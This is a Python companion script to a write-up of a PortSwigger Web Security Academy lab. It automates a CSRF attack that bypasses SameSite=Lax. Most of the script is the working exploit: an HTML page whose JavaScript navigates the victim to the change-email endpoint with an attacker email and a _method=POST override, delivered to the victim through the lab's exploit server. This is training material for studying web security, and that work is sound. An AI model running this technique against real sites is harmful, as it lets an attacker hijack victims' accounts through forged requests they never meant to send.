#!/usr/bin/env python3
"""
SameSite Lax bypass via method override
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 07-samesite-lax-method-override.md

What this does:
    There's no token to probe on this lab -- the site relies entirely on the
    browser's default SameSite=Lax policy, which still permits cookies on
    top-level GET navigations. craft_samesite_lax_method_override() in
    CSRF.py builds a page that assigns document.location to a GET URL
    carrying both the target email and a _method=POST override parameter;
    many backend frameworks honor _method to route a GET into POST-only
    handler logic. The top-level navigation stays inside Lax's exemption, so
    the victim's session cookie rides along despite the request being
    cross-site.

Usage:
    python 07-samesite-lax-method-override.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    endpoint = f"{lab_url}/my-account/change-email"
    html = (
        '<html><body>\n'
        '<script>\n'
        f'  document.location = "{endpoint}?email=hacker@evil-user.net&_method=POST";\n'
        '</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: SameSite Lax bypass: GET + _method=POST")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the top-level GET navigation carried the Lax session cookie.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
